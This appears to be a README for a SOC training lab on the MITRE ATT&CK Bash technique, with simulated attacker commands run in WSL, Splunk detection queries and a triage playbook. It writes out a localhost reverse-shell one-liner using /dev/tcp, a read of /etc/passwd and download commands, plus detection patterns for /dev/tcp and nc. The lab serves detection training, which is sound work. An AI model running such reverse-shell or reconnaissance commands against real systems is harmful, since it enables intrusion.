# MITRE ATT&CK — T1059.004  
## Command and Scripting Interpreter — Bash  
### (Linux / WSL Command Execution for SOC Analysts)

---

## 1. Overview

**Technique:** T1059 — Command and Scripting Interpreter  
**Sub-technique:** T1059.004 — Bash  
**Tactic:** Execution  

Bash is the primary command interpreter on Linux systems.  
Adversaries abuse Bash to:

- Execute malicious scripts  
- Download payloads  
- Create persistence  
- Perform privilege escalation  
- Establish reverse shells  
- Move laterally across systems  

SOC teams must monitor Bash activity to detect early signs of compromise.

---

## 2. Lab Environment

This lab simulates attacker activity using:

- **WSL (Ubuntu)**  
- Basic Linux commands  
- Suspicious attack-like behaviors:
  - Reconnaissance  
  - File downloads  
  - Script creation and execution  
  - Privilege escalation attempts  
  - Reverse shell simulation  

All commands generate logs that help analysts detect abnormal activity.

---

## 3. Simulated Attacker Commands (Executed in WSL)

### 🔹 Basic system information
```bash
uname -a
whoami
pwd

Reconnaissance
cat /etc/passwd
ps aux
id

🔹 File download simulation
wget http://example.com
curl http://example.com

🔹 Create and execute a malicious script
echo "echo HACKED" > attack.sh
chmod +x attack.sh
./attack.sh

🔹 Privilege escalation attempt
sudo ls /root

🔹 Reverse shell simulation (harmless)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

4. Screenshots Collected

The following screenshots are stored in the screenshots/ folder:

bash_commands.png
Shows all attacker-simulated commands and outputs.

5. Splunk Detection Queries (SPL)

Even if Linux logs are not yet forwarded, these SPL queries demonstrate detection engineering knowledge.

🔹 Detect suspicious Bash executions
index=linux process="bash" OR process_name="bash"
| stats count BY host user command

🔹 Detect file downloads
index=linux command="*wget*" OR command="*curl*"

🔹 Detect privilege escalation
index=linux command="sudo *"

🔹 Detect reverse shell attempts
index=linux command="*/dev/tcp/*" OR command="*nc *"

6. SOC Triage Playbook (Bash Execution)

When an alert is triggered:

✔ Step 1 — Review the executed Bash command

Is it normal admin activity?

✔ Step 2 — Check for follow-on actions

File downloads

Script creation

New processes

✔ Step 3 — Check for privilege escalation

Look for repeated sudo failures or suspicious use.

✔ Step 4 — Inspect reverse shell patterns

Any /dev/tcp or nc usage is highly suspicious.

✔ Step 5 — Contain & Remediate

Isolate VM

Reset credentials

Review persistence mechanisms

✔ Step 6 — Map to MITRE Technique
Technique: T1059.004 — Bash
Tactic: Execution

7. Files Included
README.md
screenshots/
  └── bash_commands.png

